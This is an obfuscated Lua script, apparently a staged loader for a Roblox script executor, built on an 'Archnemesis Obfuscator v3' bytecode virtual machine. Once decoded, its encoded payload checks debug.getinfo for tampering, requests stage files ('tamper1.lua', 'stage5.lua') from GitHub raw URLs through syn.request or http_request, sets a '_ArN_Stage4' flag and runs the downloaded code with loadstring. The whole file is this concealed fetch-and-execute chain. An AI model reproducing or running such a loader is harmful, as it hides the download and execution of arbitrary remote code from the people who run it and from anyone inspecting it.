-- [ Archnemesis Obfuscator v3 ]
local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 81) then
			local v87 = 0;
			while true do
				if (v87 == 0) then
					v19 = v0(v3(v30, 1, 1));
					return "";
				end
			end
		else
			local v88 = v2(v0(v30, 16));
			if v19 then
				local v112 = v5(v88, v19);
				v19 = nil;
				return v112;
			else
				return v88;
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v89 = 0;
			local v90;
			while true do
				if (v89 == (0 - 0)) then
					v90 = (v31 / (((1642 - (1523 + 114)) - 3) ^ (v32 - (1 - 0)))) % ((2 + 0) ^ (((v33 - (2 - 1)) - (v32 - (620 - (555 + 64)))) + ((1328 - 396) - (857 + 74))));
					return v90 - (v90 % (569 - (367 + 201)));
				end
			end
		else
			local v91 = (929 - (214 + 713)) ^ (v32 - (1 + 0));
			return (((v31 % (v91 + v91)) >= v91) and (1 + 0)) or (877 - (282 + 595));
		end
	end
	local function v21()
		local v34 = 1065 - (68 + (1114 - (32 + 85)));
		local v35;
		while true do
			if (v34 == 1) then
				return v35;
			end
			if (((1245 + 25) - (226 + 1044)) == v34) then
				v35 = v1(v16, v18, v18);
				v18 = v18 + 1;
				v34 = 4 - (1 + 2);
			end
		end
	end
	local function v22()
		local v36, v37 = v1(v16, v18, v18 + (959 - (892 + 65)));
		v18 = v18 + (4 - 2);
		return (v37 * 256) + v36;
	end
	local function v23()
		local v38 = 0 - 0;
		local v39;
		local v40;
		local v41;
		local v42;
		while true do
			if (v38 == 1) then
				return (v42 * 16777216) + (v41 * (120312 - 54776)) + (v40 * (606 - (87 + 263))) + v39;
			end
			if (v38 == (180 - (67 + 113))) then
				v39, v40, v41, v42 = v1(v16, v18, v18 + (11 - 8) + (952 - (802 + 150)));
				v18 = v18 + (9 - 5);
				v38 = 1 + 0;
			end
		end
	end
	local function v24()
		local v43 = 0 - 0;
		local v44;
		local v45;
		local v46;
		local v47;
		local v48;
		local v49;
		while true do
			if (v43 == ((0 + 0) - 0)) then
				v44 = v23();
				v45 = v23();
				v43 = 1 + 0;
			end
			if (v43 == (1000 - ((3340 - 2425) + 82))) then
				if (v48 == (0 - 0)) then
					if (v47 == (0 + 0 + 0)) then
						return v49 * (0 - 0);
					else
						v48 = (2047 - (814 + 45)) - (1069 + 118);
						v46 = (772 - (201 + 571)) - 0;
					end
				elseif (v48 == (4477 - 2430)) then
					return ((v47 == (0 + 0)) and (v49 * ((1 - 0) / ((0 - 0) + 0)))) or (v49 * NaN);
				end
				return v8(v49, v48 - 1023) * (v46 + (v47 / ((793 - ((1506 - (116 + 1022)) + 423)) ^ (163 - (6 + 105)))));
			end
			if (v43 == ((8 + 12) - (10 + 8))) then
				v48 = v20(v45, 80 - 59, 473 - ((1731 - 1315) + 26));
				v49 = ((v20(v45, 32) == 1) and -(3 - 2)) or (1 + 0);
				v43 = 4 - 1;
			end
			if (v43 == 1) then
				v46 = 1;
				v47 = (v20(v45, 439 - (145 + (1178 - (261 + 624))), 450 - (44 + 386)) * (2 ^ (1518 - (998 + 488)))) + v44;
				v43 = 1 + 1;
			end
		end
	end
	local function v25(v50)
		local v51 = 0 - 0;
		local v52;
		local v53;
		while true do
			if (v51 == (1083 - (1020 + (1473 - (447 + 966))))) then
				return v6(v53);
			end
			if (v51 == (1425 - (630 + 793))) then
				v53 = {};
				for v113 = 3 - 2, #v52 do
					v53[v113] = v2(v1(v3(v52, v113, v113)));
				end
				v51 = 1 + 2;
			end
			if (v51 == (0 - 0)) then
				v52 = nil;
				if not v50 then
					local v119 = 0 + 0;
					while true do
						if ((1055 - ((238 - 151) + 968)) == v119) then
							v50 = v23();
							if (v50 == (0 - 0)) then
								return "";
							end
							break;
						end
					end
				end
				v51 = 4 - 3;
			end
			if (v51 == (1748 - (760 + 987))) then
				v52 = v3(v16, v18, (v18 + v50) - 1);
				v18 = v18 + v50;
				v51 = 1915 - ((3606 - (1703 + 114)) + (825 - (376 + 325)));
			end
		end
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v54 = (function()
			return function(v92, v93, v94, v95, v96, v97, v98, v99)
				local v92 = (function()
					return 1824 - (1195 + 629);
				end)();
				local v93 = (function()
					return;
				end)();
				local v94 = (function()
					return;
				end)();
				while true do
					if (v92 == #"[") then
						if (v93 == #"[") then
							v94 = (function()
								return v95() ~= (0 - 0);
							end)();
						elseif (v93 == (813 - (569 + 242))) then
							v94 = (function()
								return v96();
							end)();
						elseif (v93 == #"19(") then
							v94 = (function()
								return v97();
							end)();
						end
						v98[v99] = (function()
							return v94;
						end)();
						break;
					end
					if (v92 == (0 - 0)) then
						local v121 = (function()
							return 0 + 0;
						end)();
						local v122 = (function()
							return;
						end)();
						while true do
							if (v121 == (241 - (187 + 54))) then
								v122 = (function()
									return 780 - (162 + 618);
								end)();
								while true do
									if ((0 + 0) == v122) then
										v93 = (function()
											return v95();
										end)();
										v94 = (function()
											return nil;
										end)();
										v122 = (function()
											return 1;
										end)();
									end
									if (v122 ~= (1 + 0)) then
									else
										v92 = (function()
											return #"/";
										end)();
										break;
									end
								end
								break;
							end
						end
					end
				end
				return v92, v93, v94, v95, v96, v97, v98, v99;
			end;
		end)();
		local v55 = (function()
			return function(v100, v101, v102)
				local v103 = (function()
					return 0;
				end)();
				local v104 = (function()
					return;
				end)();
				while true do
					if (v103 == (0 - 0)) then
						v104 = (function()
							return 0 - 0;
						end)();
						while true do
							if (v104 == 0) then
								local v127 = (function()
									return 0 + 0;
								end)();
								local v128 = (function()
									return;
								end)();
								while true do
									if (0 == v127) then
										v128 = (function()
											return 0 - 0;
										end)();
										while true do
											if (v128 ~= (1636 - (1373 + 263))) then
											else
												local v161 = (function()
													return 700 - (271 + 429);
												end)();
												while true do
													if (v161 ~= 0) then
													else
														v100[v101 - #"}"] = (function()
															return v102();
														end)();
														return v100, v101, v102;
													end
												end
											end
										end
										break;
									end
								end
							end
						end
						break;
					end
				end
			end;
		end)();
		local v56 = (function()
			return {};
		end)();
		local v57 = (function()
			return {};
		end)();
		local v58 = (function()
			return {};
		end)();
		local v59 = (function()
			return {v56,v57,nil,v58};
		end)();
		local v60 = (function()
			return v23();
		end)();
		local v61 = (function()
			return {};
		end)();
		for v69 = #" ", v60 do
			FlatIdent_60EA1, Type, Cons, v21, v24, v25, v61, v69 = (function()
				return v54(FlatIdent_60EA1, Type, Cons, v21, v24, v25, v61, v69);
			end)();
		end
		v59[#"91("] = (function()
			return v21();
		end)();
		for v70 = #"}", v23() do
			local v71 = (function()
				return v21();
			end)();
			if (v20(v71, #".", #",") ~= (0 + 0)) then
			else
				local v107 = (function()
					return 0 - 0;
				end)();
				local v108 = (function()
					return;
				end)();
				local v109 = (function()
					return;
				end)();
				local v110 = (function()
					return;
				end)();
				local v111 = (function()
					return;
				end)();
				while true do
					if (v107 == (1088 - (461 + 625))) then
						while true do
							if ((2 - 0) == v108) then
								local v129 = (function()
									return 0;
								end)();
								local v130 = (function()
									return;
								end)();
								while true do
									if (v129 == (0 + 0)) then
										v130 = (function()
											return 1171 - (418 + 753);
										end)();
										while true do
											if ((1384 - (746 + 638)) == v130) then
												if (v20(v110, #"<", #".") == #"/") then
													v111[1 + 1] = (function()
														return v61[v111[1 + 1]];
													end)();
												end
												if (v20(v110, 1 + 1, 2) == #">") then
													v111[#"nil"] = (function()
														return v61[v111[#"gha"]];
													end)();
												end
												v130 = (function()
													return 1;
												end)();
											end
											if (v130 ~= (1 + 0)) then
											else
												v108 = (function()
													return #"gha";
												end)();
												break;
											end
										end
										break;
									end
								end
							end
							if (v108 ~= #"/") then
							else
								local v131 = (function()
									return 0;
								end)();
								local v132 = (function()
									return;
								end)();
								while true do
									if (v131 ~= (0 - 0)) then
									else
										v132 = (function()
											return 341 - (218 + 123);
										end)();
										while true do
											if (v132 == (0 + 0)) then
												v111 = (function()
													return {v22(),v22(),nil,nil};
												end)();
												if (v109 == (0 + 0)) then
													local v244 = (function()
														return 1322 - (1249 + 73);
													end)();
													local v245 = (function()
														return;
													end)();
													while true do
														if (v244 ~= 0) then
														else
															v245 = (function()
																return 0 + 0;
															end)();
															while true do
																if (v245 == (0 + 0)) then
																	v111[#"-19"] = (function()
																		return v22();
																	end)();
																	v111[#".com"] = (function()
																		return v22();
																	end)();
																	break;
																end
															end
															break;
														end
													end
												elseif (v109 == #"[") then
													v111[#"xnx"] = (function()
														return v23();
													end)();
												elseif (v109 == (1147 - (466 + 679))) then
													v111[#"gha"] = (function()
														return v23() - ((562 - (306 + 254)) ^ 16);
													end)();
												elseif (v109 == #"gha") then
													local v268 = (function()
														return 0;
													end)();
													local v269 = (function()
														return;
													end)();
													while true do
														if ((0 + 0) == v268) then
															v269 = (function()
																return 0 - 0;
															end)();
															while true do
																if (v269 == (0 - 0)) then
																	v111[#"xnx"] = (function()
																		return v23() - (2 ^ (1483 - (899 + 568)));
																	end)();
																	v111[#"0313"] = (function()
																		return v22();
																	end)();
																	break;
																end
															end
															break;
														end
													end
												end
												v132 = (function()
													return 1;
												end)();
											end
											if (v132 ~= (1 + 0)) then
											else
												v108 = (function()
													return 2;
												end)();
												break;
											end
										end
										break;
									end
								end
							end
							if (v108 == #"xxx") then
								if (v20(v110, #"gha", #"gha") ~= #":") then
								else
									v111[#"asd1"] = (function()
										return v61[v111[#"http"]];
									end)();
								end
								v56[v70] = (function()
									return v111;
								end)();
								break;
							end
							if (v108 == (0 + 0)) then
								local v134 = (function()
									return 0 - 0;
								end)();
								local v135 = (function()
									return;
								end)();
								while true do
									if (v134 == 0) then
										v135 = (function()
											return 0;
										end)();
										while true do
											if (v135 == (1 + 0)) then
												v108 = (function()
													return #"\\";
												end)();
												break;
											end
											if (v135 == (114 - (4 + 110))) then
												v109 = (function()
													return v20(v71, 4 - 2, #"-19");
												end)();
												v110 = (function()
													return v20(v71, #"0313", 6);
												end)();
												v135 = (function()
													return 585 - (57 + 527);
												end)();
											end
										end
										break;
									end
								end
							end
						end
						break;
					end
					if (v107 == (1428 - (41 + 1386))) then
						local v125 = (function()
							return 0;
						end)();
						local v126 = (function()
							return;
						end)();
						while true do
							if ((603 - (268 + 335)) ~= v125) then
							else
								v126 = (function()
									return 290 - (60 + 230);
								end)();
								while true do
									if (v126 == (573 - (426 + 146))) then
										v107 = (function()
											return 1 + 1;
										end)();
										break;
									end
									if (v126 == (1456 - (282 + 1174))) then
										v110 = (function()
											return nil;
										end)();
										v111 = (function()
											return nil;
										end)();
										v126 = (function()
											return 1;
										end)();
									end
								end
								break;
							end
						end
					end
					if (v107 == (0 + 0)) then
						v108 = (function()
							return 0;
						end)();
						v109 = (function()
							return nil;
						end)();
						v107 = (function()
							return 1 - 0;
						end)();
					end
				end
			end
		end
		for v72 = #"[", v23() do
			v57, v72, v28 = (function()
				return v55(v57, v72, v28);
			end)();
		end
		return v59;
	end
	local function v29(v63, v64, v65)
		local v66 = v63[2 - 1];
		local v67 = v63[168 - (122 + 44)];
		local v68 = v63[8 - (8 - 3)];
		return function(...)
			local v73 = v66;
			local v74 = v67;
			local v75 = v68;
			local v76 = v27;
			local v77 = 1 - 0;
			local v78 = -(3 - 2);
			local v79 = {};
			local v80 = {...};
			local v81 = v12("#", ...) - (1 + 0);
			local v82 = {};
			local v83 = {};
			for v105 = 0 + 0, v81 do
				if ((v105 >= v75) or (4904 <= 1916)) then
					v79[v105 - v75] = v80[v105 + (1 - 0)];
				else
					v83[v105] = v80[v105 + (1 - 0)];
				end
			end
			local v84 = (v81 - v75) + (66 - (30 + (1283 - (111 + 1137))));
			local v85;
			local v86;
			while true do
				local v106 = 0 + 0;
				while true do
					if (v106 == (158 - (91 + 67))) then
						v85 = v73[v77];
						v86 = v85[49 - (25 + 23)];
						v106 = 1258 - (1043 + 214);
					end
					if (v106 == (3 - 2)) then
						if ((90 <= 1065) and (v86 <= (1223 - (323 + 889)))) then
							if (v86 <= (16 - (32 - 21))) then
								if (v86 <= ((184 + 550) - (16 + (1239 - (423 + 100))))) then
									if ((4802 == 4802) and (v86 <= (0 - 0))) then
										v83[v85[99 - (11 + 1 + 85)]] = {};
									elseif ((v86 > (581 - (361 + 219))) or (2280 <= 511)) then
										v83[v85[322 - (53 + 267)]][v85[288 - (175 + 110)]] = v83[v85[1 + 3]];
									else
										local v164 = v85[(24 - 15) - 7];
										v83[v164](v83[v164 + (414 - (8 + 7 + 398))]);
									end
								elseif ((v86 <= 3) or (1676 <= 463)) then
									local v138 = 1796 - (503 + 1293);
									local v139;
									while true do
										if (v138 == (983 - (18 + 964))) then
											v83[v85[7 - (776 - (326 + 445))]] = v83[v85[2 + 1]][v85[(13 - 10) + 1]];
											v77 = v77 + (851 - (20 + 830));
											v85 = v73[v77];
											v83[v85[2 + 0]] = v65[v85[129 - ((257 - 141) + 10)]];
											v138 = 1 + 1;
										end
										if (v138 == 2) then
											v77 = v77 + 1;
											v85 = v73[v77];
											v139 = v85[740 - (542 + 196)];
											v83[v139] = v83[v139](v83[v139 + (1 - 0)]);
											v138 = 1 + 2;
										end
										if (v138 == (2 + 1)) then
											v77 = v77 + 1 + 0;
											v85 = v73[v77];
											v83[v85[4 - 2]] = v83[v85[7 - 4]][v85[1 + 3]];
											v77 = v77 + (1552 - (1126 + 425));
											v138 = 1 + 3;
										end
										if ((3869 == 3869) and (v138 == (409 - (118 + 287)))) then
											v85 = v73[v77];
											if ((1158 <= 2613) and (v83[v85[7 - (11 - 6)]] ~= v85[1125 - (118 + 1003)])) then
												v77 = v77 + (2 - (712 - (530 + 181)));
											else
												v77 = v85[2 + (882 - (614 + 267))];
											end
											break;
										end
										if ((v138 == ((409 - (19 + 13)) - (142 + 235))) or (2364 <= 1999)) then
											v139 = nil;
											v83[v85[9 - 7]] = v65[v85[1 + 2]];
											v77 = v77 + (1740 - (404 + 1335));
											v85 = v73[v77];
											v138 = 978 - (553 + 424);
										end
									end
								elseif ((v86 > (7 - 3)) or (4922 < 194)) then
									v83[v85[2 + 0]] = v64[v85[3 + 0]];
								else
									local v167 = v74[v85[2 + 1]];
									local v168;
									local v169 = {};
									v168 = v10({}, {__index=function(v227, v228)
										local v229 = 0 + 0;
										local v230;
										while true do
											if (((0 + 0) == v229) or (2091 < 31)) then
												v230 = v169[v228];
												return v230[1 + 0][v230[2 + 0]];
											end
										end
									end,__newindex=function(v231, v232, v233)
										local v234 = v169[v232];
										v234[1 + 0][v234[4 - 2]] = v233;
									end});
									for v236 = 1, v85[11 - 7] do
										v77 = v77 + (2 - 1);
										local v237 = v73[v77];
										if (v237[1 + 0] == (84 - 64)) then
											v169[v236 - ((11 - 7) - 3)] = {v83,v237[1332 - (797 + 532)]};
										else
											v169[v236 - (1 + 0 + 0)] = {v64,v237[1205 - (373 + 829)]};
										end
										v82[#v82 + (732 - (476 + 255))] = v169;
									end
									v83[v85[1132 - (369 + 761)]] = v29(v167, v168, v65);
								end
							elseif ((v86 <= (5 + (6 - 3))) or (2430 >= 4872)) then
								if ((v86 <= (10 - 4)) or (4770 < 1735)) then
									if not v83[v85[3 - 1]] then
										v77 = v77 + (239 - (64 + 174));
									else
										v77 = v85[1 + 2];
									end
								elseif ((v86 > ((2986 - (1293 + 519)) - (645 + 522))) or (4439 <= 2350)) then
									if (v85[1792 - (1010 + 780)] == v83[v85[5 - 1]]) then
										v77 = v77 + ((686 - 349) - (144 + 192));
									else
										v77 = v85[3];
									end
								elseif v83[v85[(13 - 8) - 3]] then
									v77 = v77 + (217 - ((80 - 38) + 174));
								else
									v77 = v85[3 + 0];
								end
							elseif (v86 <= (8 + 1)) then
								v83[v85[1 + 1]]();
							elseif ((v86 > (1514 - (363 + 1141))) or (4479 < 4466)) then
								local v172 = 1580 - (1183 + 397);
								local v173;
								local v174;
								while true do
									if ((2547 > 1225) and (v172 == (2 - 1))) then
										for v258 = 2 - 1, #v82 do
											local v259 = v82[v258];
											for v260 = 0 + 0, #v259 do
												local v261 = v259[v260];
												local v262 = v261[1 + 0];
												local v263 = v261[2 + (0 - 0)];
												if ((4671 > 2674) and (v262 == v83) and (v263 >= v173)) then
													local v265 = 0 + 0;
													while true do
														if (v265 == (0 - 0)) then
															v174[v263] = v262[v263];
															v261[1976 - ((4506 - 2593) + 62)] = v174;
															break;
														end
													end
												end
											end
										end
										break;
									end
									if (v172 == (0 + 0)) then
										v173 = v85[2 + 0];
										v174 = {};
										v172 = 1 + 0;
									end
								end
							else
								v83[v85[5 - 3]] = v83[v85[1936 - (565 + 1368)]][v85[15 - 11]];
							end
						elseif ((v86 <= (1678 - (1477 + 184))) or (3696 < 3327)) then
							if (v86 <= (1798 - (214 + 1570))) then
								if (v86 <= (15 - 3)) then
									v83[v85[2 + 0]] = v85[859 - (564 + 292)];
								elseif (v86 > (21 - 8)) then
									if (v83[v85[5 - (2 + 1)]] == v85[308 - (244 + 60)]) then
										v77 = v77 + 1 + 0;
									else
										v77 = v85[479 - (41 + 435)];
									end
								else
									for v239 = v85[1003 - (938 + 63)], v85[3 + 0] do
										v83[v239] = nil;
									end
								end
							elseif (v86 <= (30 - 15)) then
								local v142;
								v83[v85[6 - 4]][v85[1128 - (191 + 745 + (438 - 249))]] = v85[2 + 1 + 1];
								v77 = v77 + (1614 - (1565 + 48));
								v85 = v73[v77];
								v83[v85[6 - 4]] = v85[2 + 1];
								v77 = v77 + (1139 - (782 + 356));
								v85 = v73[v77];
								v83[v85[269 - (176 + 91)]] = v83[v85[7 - 4]];
								v77 = v77 + (1 - 0);
								v85 = v73[v77];
								v83[v85[1094 - (975 + 39 + 78)]] = {};
								v77 = v77 + 1;
								v85 = v73[v77];
								v83[v85[2 - (0 + 0)]][v85[1878 - (157 + 1718)]] = v83[v85[4 + (1096 - (709 + 387))]];
								v77 = v77 + 1;
								v85 = v73[v77];
								v83[v85[6 - (1862 - (673 + 1185))]][v85[10 - 7]] = v85[1 + 3];
								v77 = v77 + (2 - 1);
								v85 = v73[v77];
								v142 = v85[1020 - (697 + 321)];
								v83[v142] = v83[v142](v83[v142 + ((5 - 3) - 1)]);
								v77 = v77 + (1 - 0);
								v85 = v73[v77];
								v83[v85[4 - (6 - 4)]] = v65[v85[2 + (1 - 0)]];
							elseif (v86 > (29 - (10 + 3))) then
								v77 = v85[2 + 0 + 1];
							else
								local v178 = 1433 - (797 + 636);
								local v179;
								while true do
									if ((v178 == (0 - 0)) or (4542 == 2970)) then
										v179 = v85[9 - 7];
										v83[v179] = v83[v179](v83[v179 + (1620 - (1427 + (258 - 66)))]);
										break;
									end
								end
							end
						elseif (v86 <= (1247 - (322 + 905))) then
							if ((252 <= 1977) and (v86 <= ((11 + 30) - (45 - 22)))) then
								v83[v85[613 - (602 + 9)]] = v65[v85[1192 - (449 + 740)]];
							elseif ((v86 == (345 - (192 + 134))) or (1436 == 3775)) then
								local v180;
								v83[v85[874 - (826 + 46)]] = {};
								v77 = v77 + (948 - (245 + 702));
								v85 = v73[v77];
								v83[v85[6 - 4]][v85[3]] = v83[v85[2 + (3 - 1)]];
								v77 = v77 + (1899 - ((2140 - (446 + 1434)) + 1638));
								v85 = v73[v77];
								v83[v85[442 - (382 + 58)]][v85[9 - 6]] = v85[4 + 0];
								v77 = v77 + (1 - 0);
								v85 = v73[v77];
								v180 = v85[2];
								v83[v180] = v83[v180](v83[v180 + (2 - 1)]);
								v77 = v77 + ((2489 - (1040 + 243)) - (902 + 303));
								v85 = v73[v77];
								v83[v85[3 - 1]] = v83[v85[(17 - 11) - 3]];
								v77 = v77 + 1 + 0;
								v85 = v73[v77];
								v83[v85[(3539 - (559 + 1288)) - (1121 + 569)]] = v65[v85[217 - (22 + 192)]];
								v77 = v77 + (684 - (483 + 200));
								v85 = v73[v77];
								v83[v85[1465 - (1404 + 59)]] = v83[v85[2 + (1932 - (609 + 1322))]][v85[1 + 3]];
								v77 = v77 + (2 - 1);
								v85 = v73[v77];
								v180 = v85[2 - 0];
								v83[v180] = v83[v180](v83[v180 + (766 - (468 + 297))]);
								v77 = v77 + 1 + 0;
								v85 = v73[v77];
								v83[v85[564 - (334 + 228)]]();
								v77 = v77 + (3 - 2);
								v85 = v73[v77];
								v83[v85[(458 - (13 + 441)) - 2]] = v85[5 - 2];
							else
								v83[v85[1 + 1]] = v83[v85[1 + 2]];
							end
						elseif (v86 <= ((963 - 705) - (141 + (248 - 153)))) then
							if ((v86 == (21 + 0)) or (1618 < 930)) then
								v83[v85[514 - (409 + 103)]][v85[7 - 4]] = v85[99 - ((254 - 203) + 44)];
							else
								local v202;
								v83[v85[1 + 1]] = v65[v85[6 - 3]];
								v77 = v77 + 1 + 0;
								v85 = v73[v77];
								v83[v85[5 - 3]] = v64[v85[3 + 0]];
								v77 = v77 + 1 + 0;
								v85 = v73[v77];
								v83[v85[2 - (0 + 0)]] = v83[v85[2 + 1]][v85[167 - (92 + 71)]];
								v77 = v77 + (1906 - (830 + 1075));
								v85 = v73[v77];
								v202 = v85[1 + 1];
								v83[v202] = v83[v202](v83[v202 + (1270 - (231 + 1038))]);
								v77 = v77 + (1 - (0 - 0));
								v85 = v73[v77];
								v83[v85[767 - (574 + 191)]]();
								v77 = v77 + 1 + 0 + 0;
								v85 = v73[v77];
								do
									return;
								end
							end
						elseif ((4723 > 4153) and (v86 > 23)) then
							if (v83[v85[4 - 2]] ~= v85[3 + 1]) then
								v77 = v77 + 1 + 0;
							else
								v77 = v85[852 - (254 + 595)];
							end
						else
							do
								return;
							end
						end
						v77 = v77 + (127 - (55 + 71));
						break;
					end
				end
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
return v15("LOL!143Q002Q033Q0073796E03073Q0072657175657374030C3Q00682Q74705F72657175657374035A3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F5665786F6C2D66696C65732F61726368656E6D657369732D6B69636B2F726566732F68656164732F6D61696E2F74616D706572312E6C756103053Q00646562756703073Q00676574696E666F030A3Q006C6F6164737472696E6703043Q007768617403013Q0043028Q00026Q00F03F2Q033Q0055726C03063Q004D6574686F642Q033Q0047455403043Q00426F647903023Q005F47030B3Q005F41724E5F5374616765342Q01035C3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F5665786F6C2D66696C65732F617263682F726566732F68656164732F6D61696E2F7374617469635F636F6E74656E742F7374616765352E6C756103053Q007063612Q6C00873Q002Q123Q00013Q0006073Q000700013Q0004113Q00070001002Q123Q00013Q00200A5Q0002002Q063Q000B000100010004113Q000B0001002Q123Q00033Q002Q063Q000B000100010004113Q000B0001002Q123Q00023Q00120C000100043Q001203000200053Q00202Q00020002000600122Q000300076Q00020002000200202Q00030002000800262Q00030079000100090004113Q0079000100120C0003000A4Q000D000400063Q00260E0003006B0001000B0004113Q006B00012Q000D000600063Q00260E000400560001000B0004113Q0056000100120C0007000A4Q000D000800093Q00260E000700460001000B0004113Q0046000100260E0008001E0001000A0004113Q001E000100120C0009000A3Q00260E000900210001000A0004113Q0021000100260E0005003E0001000A0004113Q003E000100120C000A000A4Q000D000B000B3Q000E08000A00270001000A0004113Q0027000100120C000B000A3Q00260E000B00370001000A0004113Q003700012Q0014000C6Q0013000D3Q000200102Q000D000C000100302Q000D000D000E4Q000C000200024Q0006000C3Q00122Q000C00073Q00202Q000D0006000F4Q000C000200024Q000C0001000100122Q000B000B3Q00260E000B002A0001000B0004113Q002A000100120C0005000B3Q0004113Q003E00010004113Q002A00010004113Q003E00010004113Q0027000100260E0005001A0001000B0004113Q001A00012Q00173Q00013Q0004113Q001A00010004113Q002100010004113Q001A00010004113Q001E00010004113Q001A000100260E0007001C0001000A0004113Q001C000100120C000A000A3Q00260E000A004D0001000B0004113Q004D000100120C0007000B3Q0004113Q001C000100260E000A00490001000A0004113Q0049000100120C0008000A4Q000D000900093Q00120C000A000B3Q0004113Q004900010004113Q001C00010004113Q001A00010004113Q0079000100260E000400180001000A0004113Q0018000100120C0007000A4Q000D000800083Q00260E0007005A0001000A0004113Q005A000100120C0008000A3Q00260E000800620001000A0004113Q0062000100120C0005000A4Q000D000600063Q00120C0008000B3Q00260E0008005D0001000B0004113Q005D000100120C0004000B3Q0004113Q001800010004113Q005D00010004113Q001800010004113Q005A00010004113Q001800010004113Q0079000100260E000300150001000A0004113Q0015000100120C0007000A3Q00260E000700730001000A0004113Q0073000100120C0004000A4Q000D000500053Q00120C0007000B3Q00260E0007006E0001000B0004113Q006E000100120C0003000B3Q0004113Q001500010004113Q006E00010004113Q00150001002Q12000300103Q00300F00030011001200122Q000300136Q00048Q00053Q000200102Q0005000C000300302Q0005000D000E4Q00040002000200122Q000500143Q00060400063Q000100012Q00143Q00044Q00010005000200012Q000B8Q00173Q00013Q00013Q00023Q00030A3Q006C6F6164737472696E6703043Q00426F647900063Q0012163Q00016Q00015Q00202Q0001000100026Q000200026Q000100016Q00017Q00", v9(), ...);
